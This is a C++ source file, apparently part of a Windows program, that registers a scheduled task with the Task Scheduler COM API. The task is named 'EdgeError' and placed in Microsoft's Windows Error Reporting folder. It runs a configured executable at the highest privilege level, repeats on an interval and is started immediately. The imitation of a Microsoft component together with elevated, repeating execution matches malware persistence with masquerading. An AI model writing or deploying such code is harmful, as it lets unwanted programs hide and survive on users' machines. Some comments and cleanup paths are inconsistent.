#include "stdafx.h"
#include "utils.h"
#include "config.h"

BOOL MakeSchedule(std::string time)
{
	HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
	if (FAILED(hr))
	{
		return 1;
	}

	ITaskService* pService = NULL;
	hr = CoCreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER, IID_ITaskService, (void**)&pService);
	if (FAILED(hr))
	{
		CoUninitialize();
		return 1;
	}

	hr = pService->Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t());
	if (FAILED(hr))
	{
		pService->Release();
		CoUninitialize();
		return 1;
	}

	//get Microsoft's folder and it there is no, it will use root folder
	ITaskFolder* pRootFolder = NULL;
	hr = pService->GetFolder(_bstr_t("\\Microsoft\\Windows\\Windows Error Reporting"), &pRootFolder);
	if (FAILED(hr))
	{
		hr = pService->GetFolder(_bstr_t("\\"), &pRootFolder);
		if (FAILED(hr))
		{
			pService->Release();
			CoUninitialize();
			return 1;
		}
	}

	ITaskDefinition* pTaskDefinition = NULL;
	hr = pService->NewTask(0, &pTaskDefinition);
	if (FAILED(hr))
	{
		pRootFolder->Release();
		pService->Release();
		CoUninitialize();
		return 1;
	}

	ITriggerCollection* pTriggerCollection = NULL;
	hr = pTaskDefinition->get_Triggers(&pTriggerCollection);
	if (FAILED(hr))
	{
		pTaskDefinition->Release();
		pRootFolder->Release();
		pService->Release();
		CoUninitialize();
		return 1;
	}

	ITrigger* pTrigger = NULL;
	hr = pTriggerCollection->Create(TASK_TRIGGER_TIME, &pTrigger);
	if (FAILED(hr))
	{
		pTriggerCollection->Release();
		pTaskDefinition->Release();
		pRootFolder->Release();
		pService->Release();
		CoUninitialize();
		return 1;
	}

	ITimeTrigger* pTimeTrigger = NULL;
	hr = pTrigger->QueryInterface(IID_ITimeTrigger, (void**)&pTimeTrigger);
	if (FAILED(hr))
	{
		pTrigger->Release();
		pTriggerCollection->Release();
		pTaskDefinition->Release();
		pRootFolder->Release();
		pService->Release();
		CoUninitialize();
		return 1;
	}

	// Set the trigger properties
	pTimeTrigger->put_Id(_bstr_t("Trigger1"));
	pTimeTrigger->put_StartBoundary(_bstr_t("2010-10-10T00:00:00"));
	pTimeTrigger->put_EndBoundary(_bstr_t("2030-12-31T23:59:59"));

	IRepetitionPattern* pRepetitionPattern = NULL;
	hr = pTimeTrigger->get_Repetition(&pRepetitionPattern);
	if (FAILED(hr))
	{
		pTimeTrigger->Release();
		pTrigger->Release();
		pTriggerCollection->Release();
		pTaskDefinition->Release();
		pRootFolder->Release();
		pService->Release();
		CoUninitialize();
		return 1;
	}
	// Set the repetition pattern properties
	pRepetitionPattern->put_Interval(_bstr_t(time.c_str())); // Repeat every 5 minutes
	//pRepetitionPattern->put_Duration(_bstr_t(INFINITE_TASK_DURATION)); // Repeat for 24 hours

	IActionCollection* pActionCollection = NULL;
	hr = pTaskDefinition->get_Actions(&pActionCollection);
	if (FAILED(hr))
	{
		pTimeTrigger->Release();
		pTrigger->Release();
		pTriggerCollection->Release();
		pTaskDefinition->Release();
		pRootFolder->Release();
		pService->Release();
		CoUninitialize();
		return 1;
	}

	IAction* pAction = NULL;
	hr = pActionCollection->Create(TASK_ACTION_EXEC, &pAction);
	if (FAILED(hr))
	{
		pActionCollection->Release();
		pTimeTrigger->Release();
		pTrigger->Release();
		pTriggerCollection->Release();
		pTaskDefinition->Release();
		pRootFolder->Release();
		pService->Release();
		CoUninitialize();
		return 1;
	}

	IExecAction* pExecAction = NULL;
	hr = pAction->QueryInterface(IID_IExecAction, (void**)&pExecAction);
	if (FAILED(hr))
	{
		pAction->Release();
		pActionCollection->Release();
		pTimeTrigger->Release();
		pTrigger->Release();
		pTriggerCollection->Release();
		pTaskDefinition->Release();
		pRootFolder->Release();
		pService->Release();
		CoUninitialize();
		return 1;
	}

	// Set the action properties
	CHAR expandedPath[MAX_PATH];
	ExpandEnvironmentStringsA(EXE_PATH, expandedPath, MAX_PATH);
	pExecAction->put_Path(_bstr_t(expandedPath));
	pExecAction->put_Arguments(_bstr_t("--check"));

	/////////////////////////////////////////////////////////
	// Get the principal of the task
	IPrincipal* pPrincipal = NULL;
	hr = pTaskDefinition->get_Principal(&pPrincipal);
	if (FAILED(hr))
	{
		pTaskDefinition->Release();
		//	pRegisteredTask->Release();
		pRootFolder->Release();
		pService->Release();
		CoUninitialize();
		return 1;
	}
	pPrincipal->put_RunLevel(TASK_RUNLEVEL_HIGHEST);

	// Save the changes to the task
	hr = pTaskDefinition->put_Principal(pPrincipal);
	if (FAILED(hr))
	{
		pPrincipal->Release();
		pTaskDefinition->Release();
		//pRegisteredTask->Release();
		pRootFolder->Release();
		pService->Release();
		CoUninitialize();
		return 1;
	}

	//////////////////////////////////////////////////////////////
	// Register the task in the root folder
	IRegisteredTask* pRegisteredTask = NULL;
	hr = pRootFolder->RegisterTaskDefinition(
		_bstr_t("EdgeError"),
		pTaskDefinition,
		TASK_CREATE_OR_UPDATE,
		_variant_t(),
		_variant_t(),
		TASK_LOGON_INTERACTIVE_TOKEN,
		_variant_t(L""),
		&pRegisteredTask
	);
	if (FAILED(hr))
	{
		pExecAction->Release();
		pAction->Release();
		pActionCollection->Release();
		pTimeTrigger->Release();
		pTrigger->Release();
		pTriggerCollection->Release();
		pTaskDefinition->Release();
		pRootFolder->Release();
		pService->Release();
		CoUninitialize();
		return 1;
	}

	// Run the task
	IRunningTask* pRunningTask = NULL;
	hr = pRegisteredTask->Run(_variant_t(), &pRunningTask);
	if (FAILED(hr))
	{
		pRegisteredTask->Release();
		pRepetitionPattern->Release();
		pTimeTrigger->Release();
		pTrigger->Release();
		pTriggerCollection->Release();
		pAction->Release();
		pActionCollection->Release();
		pTaskDefinition->Release();
		pRootFolder->Release();
		pService->Release();
		CoUninitialize();
		return 1;
	}

	// Cleanup
	pRegisteredTask->Release();
	pExecAction->Release();
	pAction->Release();
	pActionCollection->Release();
	pTimeTrigger->Release();
	pTrigger->Release();
	pTriggerCollection->Release();
	pTaskDefinition->Release();
	pRootFolder->Release();
	pService->Release();
	CoUninitialize();

	return 0;
}

bool CreateDirectoryRecursively(const std::string& path) {
	// Try to create the directory
	if (CreateDirectoryA(path.c_str(), NULL) || GetLastError() == ERROR_ALREADY_EXISTS) {
		return true; // Success
	}
	else {
		// If CreateDirectory failed and the error is ERROR_PATH_NOT_FOUND,
		// it means one or more parent directories don't exist.
		if (GetLastError() == ERROR_PATH_NOT_FOUND) {
			// Extract the parent directory from the given path
			size_t pos = path.find_last_of("\\/");
			if (pos != std::string::npos) {
				std::string parentDir = path.substr(0, pos);
				// Recursively create the parent directory
				if (CreateDirectoryRecursively(parentDir)) {
					// Retry creating the original directory after the parent is created
					return CreateDirectoryA(path.c_str(), NULL) || GetLastError() == ERROR_ALREADY_EXISTS;
				}
			}
		}
		return false; // Failed to create directory
	}
}
